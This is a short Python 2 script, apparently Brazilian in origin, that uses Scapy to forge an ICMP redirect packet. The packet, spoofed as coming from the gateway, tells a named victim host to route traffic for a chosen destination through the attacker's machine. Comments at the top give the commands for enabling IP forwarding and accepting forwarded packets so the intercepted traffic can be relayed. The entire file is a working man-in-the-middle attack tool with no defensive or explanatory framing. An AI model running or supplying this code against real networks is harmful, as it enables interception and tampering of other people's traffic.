#!/usr/bin/python2

'''
# icmpcodes[5] = { 0: 'network-redirect', 1: 'host-redirect', 2: 'TOS-network-redirect', 3: 'TOS-host-redirect' }
# sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
# sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects'
# sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/wlp2s0/send_redirects'
# sudo iptables -P FORWARD ACCEPT
'''

import sys
from scapy.all import *

#conf.L3socket=L3RawSocket

if len(sys.argv) < 3:
   print "Send ICMP redirect message from [ip_gateway] to ip_victim redireting traffic"
   print "to [ip_myself] with destion MAC address [mac_addr_victim] for destination [ip_destination_to_redirect]"
   print "Usage:", sys.argv[0], "[ip_gateway]", "[ip_victim]", "[ip_myself]", "[mac_addr_victim] [ip_destination_to_redirect]"
   exit(1)

#conf.iface='ppp0'
conf.iface='wlp2s0'
conf.ipv6_enabled=False
ROUTER=sys.argv[1]
VITIMA=sys.argv[2]
MYSELF=sys.argv[3]
MACDST=sys.argv[4]
DESTIN=sys.argv[5]

# send at L2
packet=Ether(src='00:aa:bb:00:ca:fe', dst=MACDST)/ \
       IP(src=ROUTER, dst=VITIMA, flags='DF')/ \
       ICMP(type=5, code=2, gw=MYSELF)/ \
       IP(src=VITIMA, dst=DESTIN, flags='DF')/ \
       TCP(sport=int(RandShort()), dport=80, flags='PA', seq=int(RandInt()), ack=int(RandInt()))


# interact(mydict=globals()) # as vezes da pau se passar muitos parametros
sendp(packet)

print '[+] sent ICMP type 5 to IP', VITIMA, 'redirecting to', DESTIN

